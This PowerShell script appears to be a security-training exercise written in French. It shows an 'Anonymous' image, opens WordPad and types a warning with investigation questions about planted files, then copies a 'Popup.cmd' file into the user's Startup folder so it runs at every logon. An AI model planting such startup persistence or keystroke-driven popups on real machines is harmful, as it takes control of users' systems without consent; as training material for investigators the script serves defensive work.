Add-Type -AssemblyName System.Windows.Forms
Invoke-item "\\Mon_Serveur_De_Fichiers_Partagés\Anonymous.jpg"
Start-Process Wordpad
Start-Sleep -Seconds 3
[System.Windows.Forms.SendKeys]::SendWait("Attention à ce que vous ouvrez ! J ai collé un fichier sur votre environnement USERPROFILE. A vous de le retrouver :3")
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
[System.Windows.Forms.SendKeys]::SendWait("Questions :")
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
[System.Windows.Forms.SendKeys]::SendWait("1 - Que fait le fichier Excel ?")
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
[System.Windows.Forms.SendKeys]::SendWait("2 - Que font les scripts ?")
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
[System.Windows.Forms.SendKeys]::SendWait("3 - Quelles sont les étapes d'investigations ?")
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
[System.Windows.Forms.SendKeys]::SendWait("4 - Proposez des remédiations")
xcopy "\\Mon_Serveur_De_Fichiers_Partagés\Popup.cmd" "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" /H